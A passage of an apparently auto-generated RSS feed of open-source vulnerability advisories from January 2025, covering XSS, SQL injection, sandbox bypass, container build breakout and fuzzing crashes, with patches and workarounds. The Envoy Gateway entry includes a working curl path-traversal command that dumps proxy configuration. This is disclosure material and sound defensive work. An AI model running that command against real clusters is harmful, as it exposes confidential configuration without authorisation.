                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-57556</link>
                    <pubDate>2025-01-23T22:15:15Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-57556'>https://osv.dev/vulnerability/CVE-2024-57556</a><br>
                            <b>Published:</b> 2025-01-23T22:15:15Z<br>
                            <b>Severity:</b> 6.1<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/nbubna/store/issues/127'>https://github.com/nbubna/store/issues/127</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Cross Site Scripting vulnerability in nbubna store v.2.14.2 and before allows a remote attacker to execute arbitrary code via the store.deep.js component
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-27c6-mcxv-x3fh: 7.5 | <b>Unlimited consumption of resources in @fastify&#x2F;multipart</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-27c6-mcxv-x3fh</link>
                    <pubDate>2025-01-23T18:02:07Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-27c6-mcxv-x3fh'>https://osv.dev/vulnerability/GHSA-27c6-mcxv-x3fh</a><br>
                            <b>Published:</b> 2025-01-23T18:02:07Z<br>
                            <b>Severity:</b> 7.5<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/fastify/fastify-multipart/security/advisories/GHSA-27c6-mcxv-x3fh'>https://github.com/fastify/fastify-multipart/security/advisories/GHSA-27c6-mcxv-x3fh</a></li><li>- <a target='_blank' href='https://github.com/fastify/fastify-multipart/issues/546'>https://github.com/fastify/fastify-multipart/issues/546</a></li><li>- <a target='_blank' href='https://github.com/fastify/fastify-multipart/pull/567'>https://github.com/fastify/fastify-multipart/pull/567</a></li><li>- <a target='_blank' href='https://github.com/fastify/fastify-multipart'>https://github.com/fastify/fastify-multipart</a></li></ul><br>
                            <b>Details:</b> <b>Unlimited consumption of resources in @fastify&#x2F;multipart</b><br>### Impact

The `saveRequestFiles` function does not delete the uploaded temporary files when user cancels the request.

### Patches

Fixed in version 8.3.1 and 9.0.3

### Workarounds

Do not use `saveRequestFiles`.

### References

This was identified in https:&#x2F;&#x2F;github.com&#x2F;fastify&#x2F;fastify-multipart&#x2F;issues&#x2F;546 and fixed in https:&#x2F;&#x2F;github.com&#x2F;fastify&#x2F;fastify-multipart&#x2F;pull&#x2F;567.

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-j777-63hf-hx76: 7.1 | <b>Envoy Admin Interface Exposed through prometheus metrics endpoint</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-j777-63hf-hx76</link>
                    <pubDate>2025-01-23T17:51:08Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-j777-63hf-hx76'>https://osv.dev/vulnerability/GHSA-j777-63hf-hx76</a><br>
                            <b>Published:</b> 2025-01-23T17:51:08Z<br>
                            <b>Severity:</b> 7.1<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/envoyproxy/gateway/security/advisories/GHSA-j777-63hf-hx76'>https://github.com/envoyproxy/gateway/security/advisories/GHSA-j777-63hf-hx76</a></li><li>- <a target='_blank' href='https://github.com/envoyproxy/gateway/commit/3eb3301ab3dbf12b201b47bdb6074d1233be07bd'>https://github.com/envoyproxy/gateway/commit/3eb3301ab3dbf12b201b47bdb6074d1233be07bd</a></li><li>- <a target='_blank' href='https://github.com/envoyproxy/gateway'>https://github.com/envoyproxy/gateway</a></li><li>- <a target='_blank' href='https://www.envoyproxy.io/docs/envoy/latest/configuration/best_practices/edge'>https://www.envoyproxy.io/docs/envoy/latest/configuration/best_practices/edge</a></li><li>- <a target='_blank' href='https://www.envoyproxy.io/docs/envoy/latest/operations/admin'>https://www.envoyproxy.io/docs/envoy/latest/operations/admin</a></li></ul><br>
                            <b>Details:</b> <b>Envoy Admin Interface Exposed through prometheus metrics endpoint</b><br>### Impact
A user with access to a Kubernetes cluster where Envoy Gateway is installed can use a path traversal attack to execute Envoy Admin interface commands on proxies managed by Envoy Gateway. The admin interface can be used to terminate the Envoy process and extract the Envoy configuration (possibly containing confidential data). 

For example, the following command, if run from within the Kubernetes cluster, can be used to get the configuration dump of the proxy:
```
curl --path-as-is http:&#x2F;&#x2F;&amp;lt;Proxy-Service-ClusterIP&amp;gt;:19001&#x2F;stats&#x2F;prometheus&#x2F;..&#x2F;..&#x2F;config_dump
```
### Patches
1.2.6

### Workarounds
The `EnvoyProxy` API can be used to apply a bootstrap config patch that restricts access strictly to the prometheus stats endpoint. Find below an example of such a bootstrap patch. 

```
apiVersion: gateway.envoyproxy.io&#x2F;v1alpha1
kind: EnvoyProxy
metadata:
  name: custom-proxy-config
  namespace: default
spec:
  bootstrap:
    type: JSONPatch
    jsonPatches:
    - op: &quot;add&quot;
      path: &quot;&#x2F;static_resources&#x2F;listeners&#x2F;0&#x2F;filter_chains&#x2F;0&#x2F;filters&#x2F;0&#x2F;typed_config&#x2F;normalize_path&quot;
      value: true
    - op: &quot;replace&quot;
      path: &quot;&#x2F;static_resources&#x2F;listeners&#x2F;0&#x2F;filter_chains&#x2F;0&#x2F;filters&#x2F;0&#x2F;typed_config&#x2F;route_config&#x2F;virtual_hosts&#x2F;0&#x2F;routes&#x2F;0&#x2F;match&quot;
      value:
        path: &quot;&#x2F;stats&#x2F;prometheus&quot;
        headers:
          - name: &quot;:method&quot;
            exact_match: GET
```

### References
- Envoy Admin Interface: https:&#x2F;&#x2F;www.envoyproxy.io&#x2F;docs&#x2F;envoy&#x2F;latest&#x2F;operations&#x2F;admin
- Envoy Configuration Best Practices: https:&#x2F;&#x2F;www.envoyproxy.io&#x2F;docs&#x2F;envoy&#x2F;latest&#x2F;configuration&#x2F;best_practices&#x2F;edge
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-gmj9-h825-chq2: 7.9 | <b>try&#x2F;except* clauses could allow bypass RestrictedPython via type confusion bug in the CPython interpreter</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-gmj9-h825-chq2</link>
                    <pubDate>2025-01-23T17:19:34Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-gmj9-h825-chq2'>https://osv.dev/vulnerability/GHSA-gmj9-h825-chq2</a><br>
                            <b>Published:</b> 2025-01-23T17:19:34Z<br>
                            <b>Severity:</b> 7.9<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/zopefoundation/RestrictedPython/security/advisories/GHSA-gmj9-h825-chq2'>https://github.com/zopefoundation/RestrictedPython/security/advisories/GHSA-gmj9-h825-chq2</a></li><li>- <a target='_blank' href='https://github.com/zopefoundation/RestrictedPython/commit/48a92c5bb617a647cffd0dadd4d5cfe626bcdb2f'>https://github.com/zopefoundation/RestrictedPython/commit/48a92c5bb617a647cffd0dadd4d5cfe626bcdb2f</a></li><li>- <a target='_blank' href='https://github.com/zopefoundation/RestrictedPython'>https://github.com/zopefoundation/RestrictedPython</a></li></ul><br>
                            <b>Details:</b> <b>try&#x2F;except* clauses could allow bypass RestrictedPython via type confusion bug in the CPython interpreter</b><br>### Impact
Via a type confusion bug in the CPython interpreter when using `try&#x2F;except*` RestrictedPython could be bypassed.

We believe this should be fixed upstream in Python itself until that we remove support for `try&#x2F;except*` from RestrictedPython.
(It has been fixed for some Python versions.)

### Patches
Patched in version 8.0 by removing support for `try&#x2F;except*` clauses

### Workarounds
There is no workaround.

### References
none

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-13236: 6.5 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-13236</link>
                    <pubDate>2025-01-23T12:15:27Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-13236'>https://osv.dev/vulnerability/CVE-2024-13236</a><br>
                            <b>Published:</b> 2025-01-23T12:15:27Z<br>
                            <b>Severity:</b> 6.5<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://plugins.trac.wordpress.org/browser/tainacan/tags/0.21.12/classes/api/endpoints/class-tainacan-rest-reports-controller.php#L707'>https://plugins.trac.wordpress.org/browser/tainacan/tags/0.21.12/classes/api/endpoints/class-tainacan-rest-reports-controller.php#L707</a></li><li>- <a target='_blank' href='https://plugins.trac.wordpress.org/browser/tainacan/tags/0.21.12/classes/api/endpoints/class-tainacan-rest-reports-controller.php#L732'>https://plugins.trac.wordpress.org/browser/tainacan/tags/0.21.12/classes/api/endpoints/class-tainacan-rest-reports-controller.php#L732</a></li><li>- <a target='_blank' href='https://www.wordfence.com/threat-intel/vulnerabilities/id/9638fb98-045b-44ec-8b53-15cfa3693ee7?source=cve'>https://www.wordfence.com/threat-intel/vulnerabilities/id/9638fb98-045b-44ec-8b53-15cfa3693ee7?source=cve</a></li></ul><br>
                            <b>Details:</b> <b></b><br>The Tainacan plugin for WordPress is vulnerable to SQL Injection via the &#x27;collection_id&#x27; parameter in all versions up to, and including, 0.21.12 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query.  This makes it possible for authenticated attackers, with Subscriber-level access and above, to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-788m-27g4-cf86: 5.4 | <b>Cross site scripting in Silverpeas Core</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-788m-27g4-cf86</link>
                    <pubDate>2025-01-22T21:30:57Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-788m-27g4-cf86'>https://osv.dev/vulnerability/GHSA-788m-27g4-cf86</a><br>
                            <b>Published:</b> 2025-01-22T21:30:57Z<br>
                            <b>Severity:</b> 5.4<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/Silverpeas/Silverpeas-Core/pull/1373'>https://github.com/Silverpeas/Silverpeas-Core/pull/1373</a></li><li>- <a target='_blank' href='https://github.com/Mohamed-Saqib-C/CVEs/blob/main/CVE-2024-56923/README.md'>https://github.com/Mohamed-Saqib-C/CVEs/blob/main/CVE-2024-56923/README.md</a></li><li>- <a target='_blank' href='https://github.com/Silverpeas/Silverpeas-Core'>https://github.com/Silverpeas/Silverpeas-Core</a></li></ul><br>
                            <b>Details:</b> <b>Cross site scripting in Silverpeas Core</b><br>Stored Cross-Site Scripting (XSS) Vulnerability in the Categorization Option of My Subscriptions Functionality in Silverpeas Core 6.3.1 &amp;lt;= 6.4.1 allows a remote attacker to execute arbitrary JavaScript code. This is achieved by injecting a malicious payload into the Name field of a subscription. The attack can lead to session hijacking, data theft, or unauthorized actions when an admin user views the affected subscription.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-572q-86rr-5vgq: 6.5 | <b>Umbraco Rich Text Display allows Cross-Site Scripting</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-572q-86rr-5vgq</link>
                    <pubDate>2025-01-22T18:31:55Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-572q-86rr-5vgq'>https://osv.dev/vulnerability/GHSA-572q-86rr-5vgq</a><br>
                            <b>Published:</b> 2025-01-22T18:31:55Z<br>
                            <b>Severity:</b> 6.5<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/umbraco/Umbraco-CMS/pull/17164'>https://github.com/umbraco/Umbraco-CMS/pull/17164</a></li><li>- <a target='_blank' href='https://github.com/umbraco/Umbraco-CMS'>https://github.com/umbraco/Umbraco-CMS</a></li><li>- <a target='_blank' href='https://github.com/umbraco/Umbraco-CMS/releases/tag/release-15.0.0-rc1'>https://github.com/umbraco/Umbraco-CMS/releases/tag/release-15.0.0-rc1</a></li><li>- <a target='_blank' href='https://www.nccgroup.com/us/research-blog/technical-advisory-cross-site-scripting-in-umbraco-rich-text-display'>https://www.nccgroup.com/us/research-blog/technical-advisory-cross-site-scripting-in-umbraco-rich-text-display</a></li><li>- <a target='_blank' href='http://umbraco.com'>http://umbraco.com</a></li></ul><br>
                            <b>Details:</b> <b>Umbraco Rich Text Display allows Cross-Site Scripting</b><br>A stored cross-site scripting (XSS) vulnerability in Umbraco CMS v14.3.1 allows attackers to execute arbitrary web scripts or HTML via a crafted payload.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-35pq-7pv2-2rfw: 6.2 | <b>ps_contactinfo has a potential XSS due to usage of the nofilter tag in template</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-35pq-7pv2-2rfw</link>
                    <pubDate>2025-01-22T18:10:58Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-35pq-7pv2-2rfw'>https://osv.dev/vulnerability/GHSA-35pq-7pv2-2rfw</a><br>
                            <b>Published:</b> 2025-01-22T18:10:58Z<br>
                            <b>Severity:</b> 6.2<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/PrestaShop/ps_contactinfo/security/advisories/GHSA-35pq-7pv2-2rfw'>https://github.com/PrestaShop/ps_contactinfo/security/advisories/GHSA-35pq-7pv2-2rfw</a></li><li>- <a target='_blank' href='https://github.com/PrestaShop/ps_contactinfo/commit/d60f9a5634b4fc2d3a8831fb08fe2e1f23cbfa39'>https://github.com/PrestaShop/ps_contactinfo/commit/d60f9a5634b4fc2d3a8831fb08fe2e1f23cbfa39</a></li><li>- <a target='_blank' href='https://github.com/PrestaShop/ps_contactinfo'>https://github.com/PrestaShop/ps_contactinfo</a></li></ul><br>
                            <b>Details:</b> <b>ps_contactinfo has a potential XSS due to usage of the nofilter tag in template</b><br>### Impact
This can not be exploited in a fresh install of PrestaShop, only shops made vulnerable by third party modules are concerned. 

For example, if your shop has a third party module vulnerable to SQL injections, then ps_contactinfo might execute a stored XSS in FO.

### Patches
The long term fix is to have all your modules maintained and updated.
The fix on ps_contactinfo will keep formatted addresses from displaying an xss stored in the database.

### Workarounds
none

### References
none
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-h78m-j95m-5356: 6.5 | <b>Cilium has an information leakage via insecure default Hubble UI CORS header</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-h78m-j95m-5356</link>
                    <pubDate>2025-01-22T18:09:27Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-h78m-j95m-5356'>https://osv.dev/vulnerability/GHSA-h78m-j95m-5356</a><br>
                            <b>Published:</b> 2025-01-22T18:09:27Z<br>
                            <b>Severity:</b> 6.5<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/cilium/cilium/security/advisories/GHSA-h78m-j95m-5356'>https://github.com/cilium/cilium/security/advisories/GHSA-h78m-j95m-5356</a></li><li>- <a target='_blank' href='https://github.com/cilium/cilium/commit/a3489f190ba6e87b5336ee685fb6c80b1270d06d'>https://github.com/cilium/cilium/commit/a3489f190ba6e87b5336ee685fb6c80b1270d06d</a></li><li>- <a target='_blank' href='https://github.com/cilium/cilium'>https://github.com/cilium/cilium</a></li></ul><br>
                            <b>Details:</b> <b>Cilium has an information leakage via insecure default Hubble UI CORS header</b><br>### Impact

For users who deploy Hubble UI using either Cilium CLI or via the Cilium Helm chart, an insecure default `Access-Control-Allow-Origin` header value could lead to sensitive data exposure. A user with access to a Hubble UI instance affected by this issue could leak configuration details about the Kubernetes cluster which Hubble UI is monitoring, including node names, IP addresses, and other metadata about workloads and the cluster networking configuration. In order for this vulnerability to be exploited, a victim would have to first visit a malicious page.

### Patches

This issue was patched in https:&#x2F;&#x2F;github.com&#x2F;cilium&#x2F;cilium&#x2F;commit&#x2F;a3489f190ba6e87b5336ee685fb6c80b1270d06d

This issue affects:

- Cilium between v1.14.0 and v1.14.18 inclusive
- Cilium between v1.15.0 and v1.15.12 inclusive
- Cilium between v1.16.0 and v1.16.5 inclusive

This issue is patched in:

- Cilium v1.14.19
- Cilium v1.15.13
- Cilium v1.16.6

### Workarounds

Users who deploy Hubble UI using the Cilium Helm chart directly can remove the CORS headers from the Helm template as shown in the [patch](https:&#x2F;&#x2F;github.com&#x2F;cilium&#x2F;cilium&#x2F;commit&#x2F;a3489f190ba6e87b5336ee685fb6c80b1270d06d).

### Acknowledgements

The Cilium community has worked together with members of Isovalent to prepare these mitigations. Special thanks to @ciffelia for reporting this issue and to @geakstr for the fix.

### For more information
If you have any questions or comments about this advisory, please reach out on [Slack](https:&#x2F;&#x2F;docs.cilium.io&#x2F;en&#x2F;latest&#x2F;community&#x2F;community&#x2F;#slack).

If you think you have found a vulnerability affecting Cilium, we strongly encourage you to report it to our security mailing list at [security@cilium.io](mailto:security@cilium.io). This is a private mailing list for the Cilium security team, and your report will be treated as top priority.

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-9m5p-c77c-f9j7: 5.3 | <b>DoS in Cilium agent DNS proxy from crafted DNS responses</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-9m5p-c77c-f9j7</link>
                    <pubDate>2025-01-22T18:08:13Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-9m5p-c77c-f9j7'>https://osv.dev/vulnerability/GHSA-9m5p-c77c-f9j7</a><br>
                            <b>Published:</b> 2025-01-22T18:08:13Z<br>
                            <b>Severity:</b> 5.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/cilium/cilium/security/advisories/GHSA-9m5p-c77c-f9j7'>https://github.com/cilium/cilium/security/advisories/GHSA-9m5p-c77c-f9j7</a></li><li>- <a target='_blank' href='https://github.com/cilium/cilium/pull/36252'>https://github.com/cilium/cilium/pull/36252</a></li><li>- <a target='_blank' href='https://github.com/cilium/cilium/commit/1971bc684b6b36703ebae0dd7539c623f988a257'>https://github.com/cilium/cilium/commit/1971bc684b6b36703ebae0dd7539c623f988a257</a></li><li>- <a target='_blank' href='https://github.com/cilium/cilium/commit/b1948e217a4212b81175d8bf763d0ef350fcc96c'>https://github.com/cilium/cilium/commit/b1948e217a4212b81175d8bf763d0ef350fcc96c</a></li><li>- <a target='_blank' href='https://github.com/cilium/cilium'>https://github.com/cilium/cilium</a></li></ul><br>
                            <b>Details:</b> <b>DoS in Cilium agent DNS proxy from crafted DNS responses</b><br>### Impact

In a Kubernetes cluster where Cilium is configured to proxy DNS traffic, an attacker can crash Cilium agents by sending a crafted DNS response to workloads from outside the cluster.

For traffic that is allowed but without using DNS-based policy, the dataplane will continue to pass traffic as configured at the time of the DoS. For workloads that have DNS-based policy configured, existing connections may continue to operate, and new connections made without relying on DNS resolution may continue to be established, but new connections which rely on DNS resolution may be disrupted. Any configuration changes that affect the impacted agent may not be applied until the agent is able to  restart.

### Patches

This issue affects:

- Cilium v1.14 between v1.14.0 and v1.14.17 inclusive
- Cilium v1.15 between v1.15.0 and v1.15.11 inclusive
- Cilium v1.16 between v1.16.0 and v1.16.4 inclusive

This issue is fixed in:

- Cilium v1.14.18
- Cilium v1.15.12
- Cilium v1.16.5

### Workarounds

There are no known workarounds to this issue.

### Acknowledgements

The Cilium community has worked together with members of Isovalent and the Cisco Advanced Security Initiatives Group (ASIG) to prepare these mitigations. Special thanks to @kokelley-cisco for reporting this issue and @bimmlerd for the fix.

### For more information

If you have any questions or comments about this advisory, please reach out on [Slack](https:&#x2F;&#x2F;docs.cilium.io&#x2F;en&#x2F;latest&#x2F;community&#x2F;community&#x2F;#slack).

If you think you have found a vulnerability affecting Cilium, we strongly encourage you to report it to our security mailing list at [security@cilium.io](mailto:security@cilium.io). This is a private mailing list for the Cilium security team, and your report will be treated as top priority.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>OSV-2025-52: 0 | <b>Use-of-uninitialized-value in icalmemory_strdup</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#OSV-2025-52</link>
                    <pubDate>2025-01-22T00:07:34.573371Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/OSV-2025-52'>https://osv.dev/vulnerability/OSV-2025-52</a><br>
                            <b>Published:</b> 2025-01-22T00:07:34.573371Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=390646669'>https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=390646669</a></li></ul><br>
                            <b>Details:</b> <b>Use-of-uninitialized-value in icalmemory_strdup</b><br>OSS-Fuzz report: https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;oss-fuzz&#x2F;issues&#x2F;detail?id=390646669

```
Crash type: Use-of-uninitialized-value
Crash state:
icalmemory_strdup
icaltimezone_init_builtin_timezones
icaltimezone_get_utc_timezone
```

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>OSV-2025-51: 0 | <b>Heap-buffer-overflow in std::__1::__function::__func&amp;lt;cv::PngDecoder::compose_frame</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#OSV-2025-51</link>
                    <pubDate>2025-01-22T00:03:50.355443Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/OSV-2025-51'>https://osv.dev/vulnerability/OSV-2025-51</a><br>
                            <b>Published:</b> 2025-01-22T00:03:50.355443Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=390788198'>https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=390788198</a></li></ul><br>
                            <b>Details:</b> <b>Heap-buffer-overflow in std::__1::__function::__func&amp;lt;cv::PngDecoder::compose_frame</b><br>OSS-Fuzz report: https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;oss-fuzz&#x2F;issues&#x2F;detail?id=390788198

```
Crash type: Heap-buffer-overflow WRITE {*}
Crash state:
std::__1::__function::__func&amp;lt;cv::PngDecoder::compose_frame
cv::ParallelLoopBodyWrapper::operator
cv::ThreadPool::run
```

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-4cv2-4hjh-77rx: 0 | <b>Property reflection in System.Linq.Dynamic.Core</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-4cv2-4hjh-77rx</link>
                    <pubDate>2025-01-21T21:30:53Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-4cv2-4hjh-77rx'>https://osv.dev/vulnerability/GHSA-4cv2-4hjh-77rx</a><br>
                            <b>Published:</b> 2025-01-21T21:30:53Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/zzzprojects/System.Linq.Dynamic.Core/issues/867'>https://github.com/zzzprojects/System.Linq.Dynamic.Core/issues/867</a></li><li>- <a target='_blank' href='https://github.com/zzzprojects/System.Linq.Dynamic.Core/commit/49b6cf0909cf3571e0d3580317675408300dbdac'>https://github.com/zzzprojects/System.Linq.Dynamic.Core/commit/49b6cf0909cf3571e0d3580317675408300dbdac</a></li><li>- <a target='_blank' href='https://dynamic-linq.net/expression-language#operators'>https://dynamic-linq.net/expression-language#operators</a></li><li>- <a target='_blank' href='https://github.com/zzzprojects/System.Linq.Dynamic.Core'>https://github.com/zzzprojects/System.Linq.Dynamic.Core</a></li><li>- <a target='_blank' href='https://zzzprojects.com'>https://zzzprojects.com</a></li></ul><br>
                            <b>Details:</b> <b>Property reflection in System.Linq.Dynamic.Core</b><br>An issue in System.Linq.Dynamic.Core versions before v.1.6.0 allow remote access to properties on reflection types and static properties&#x2F;fields.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-69cg-w8vm-h229: 4.3 | <b>XSS&#x2F;HTML Injection Vulnerability in Umbraco Preview Badge</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-69cg-w8vm-h229</link>
                    <pubDate>2025-01-21T21:24:20Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-69cg-w8vm-h229'>https://osv.dev/vulnerability/GHSA-69cg-w8vm-h229</a><br>
                            <b>Published:</b> 2025-01-21T21:24:20Z<br>
                            <b>Severity:</b> 4.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/umbraco/Umbraco-CMS/security/advisories/GHSA-69cg-w8vm-h229'>https://github.com/umbraco/Umbraco-CMS/security/advisories/GHSA-69cg-w8vm-h229</a></li><li>- <a target='_blank' href='https://github.com/umbraco/Umbraco-CMS'>https://github.com/umbraco/Umbraco-CMS</a></li></ul><br>
                            <b>Details:</b> <b>XSS&#x2F;HTML Injection Vulnerability in Umbraco Preview Badge</b><br>### Impact

Authenticated users are able to exploit an XSS vulnerability when viewing previewed content.

### Patches

Will be patched in 10.8.8, 13.5.3, 14.3.2 and 15.1.2.

### Workarounds

None available.

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-5vpc-35f4-r8w6: 8.6 | <b>Buildah allows build breakout using malicious Containerfiles and concurrent builds</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-5vpc-35f4-r8w6</link>
                    <pubDate>2025-01-21T21:22:49Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-5vpc-35f4-r8w6'>https://osv.dev/vulnerability/GHSA-5vpc-35f4-r8w6</a><br>
                            <b>Published:</b> 2025-01-21T21:22:49Z<br>
                            <b>Severity:</b> 8.6<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/containers/buildah/security/advisories/GHSA-5vpc-35f4-r8w6'>https://github.com/containers/buildah/security/advisories/GHSA-5vpc-35f4-r8w6</a></li><li>- <a target='_blank' href='https://access.redhat.com/errata/RHSA-2025:0878'>https://access.redhat.com/errata/RHSA-2025:0878</a></li><li>- <a target='_blank' href='https://access.redhat.com/errata/RHSA-2025:0922'>https://access.redhat.com/errata/RHSA-2025:0922</a></li><li>- <a target='_blank' href='https://access.redhat.com/errata/RHSA-2025:0923'>https://access.redhat.com/errata/RHSA-2025:0923</a></li><li>- <a target='_blank' href='https://access.redhat.com/security/cve/CVE-2024-11218'>https://access.redhat.com/security/cve/CVE-2024-11218</a></li><li>- <a target='_blank' href='https://bugzilla.redhat.com/show_bug.cgi?id=2326231'>https://bugzilla.redhat.com/show_bug.cgi?id=2326231</a></li><li>- <a target='_blank' href='https://github.com/containers/buildah'>https://github.com/containers/buildah</a></li><li>- <a target='_blank' href='https://issues.redhat.com/browse/RHEL-67616'>https://issues.redhat.com/browse/RHEL-67616</a></li><li>- <a target='_blank' href='https://issues.redhat.com/browse/RHEL-67618'>https://issues.redhat.com/browse/RHEL-67618</a></li></ul><br>
                            <b>Details:</b> <b>Buildah allows build breakout using malicious Containerfiles and concurrent builds</b><br>### Impact
With careful use of the `--mount` flag in RUN instructions in Containerfiles, and by using either multi-stage builds with use of concurrently-executing build stages (e.g., using the `--jobs` CLI flag) or multiple separate but concurrently-executing builds, a malicious Containerfile can be used to expose content from the build host to the command being run using the RUN instruction.  This can be used to read or write contents using the privileges of the process which is performing the build.  When that process is a root-owned podman system service which is provided for use by unprivileged users, this includes the ability to read and write contents which the client should not be allowed to read and write, including setuid executables in locations where they can be later accessed by unprivileged users.

### Patches
Patches have been merged to the main branch, and will be added to upcoming releases on the release-1.38, release-1.37, release-1.35, and release-1.33 branches.

This addressed a number of Jira cards, but primarily https:&#x2F;&#x2F;issues.redhat.com&#x2F;browse&#x2F;RHEL-67616 and https:&#x2F;&#x2F;issues.redhat.com&#x2F;browse&#x2F;RHEL-67618, which were then vendored into Podman and backported into olde rbranches.

### Workarounds
Mandatory access controls should limit the access of the process performing the build, on systems where they are enabled.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-hmg4-wwm5-p999: 5.3 | <b>Umbraco Allows User Enumeration Feasible Based On Management API Timing and Response Codes </b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-hmg4-wwm5-p999</link>
                    <pubDate>2025-01-21T21:21:30Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-hmg4-wwm5-p999'>https://osv.dev/vulnerability/GHSA-hmg4-wwm5-p999</a><br>
                            <b>Published:</b> 2025-01-21T21:21:30Z<br>
                            <b>Severity:</b> 5.3<br>
                            <b>Langs:</b> <br>
